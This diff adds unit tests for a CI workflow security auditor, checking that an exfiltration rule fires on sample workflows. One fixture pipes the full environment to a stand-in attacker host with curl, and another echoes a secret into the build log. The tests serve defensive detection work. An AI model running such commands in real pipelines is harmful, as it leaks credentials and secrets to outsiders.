@@ -58,3 +58,30 @@ def test_secret_to_platform_host_same_api_not_high():
     # talking to api.github.com is not treated as foreign-host exfil (no finding here)
     out = _run001(BENIGN_DEPLOY)
     assert all(f.severity.value not in ("HIGH", "CRITICAL") for f in out)
+
+
+import credence.workflow_audit.rules.exfil_rules as _ex
+
+
+def _run002(text):
+    wf = parse_workflow(text, path="x")
+    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
+    return list(_ex.wf_exfil_002(wf, resolved, RuleContext()))
+
+
+def test_env_piped_to_network_fires():
+    out = _run002("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
+                  "      - run: env | curl --data-binary @- https://evil.example")
+    assert any(f.rule_id == "WF-EXFIL-002" for f in out)
+
+
+def test_echo_secret_to_log_fires():
+    out = _run002("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
+                  '      - run: echo "${{ secrets.PROD }}"')
+    assert any(f.rule_id == "WF-EXFIL-002" for f in out)
+
+
+def test_plain_echo_no_finding():
+    out = _run002("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
+                  "      - run: echo hello")
+    assert out == []
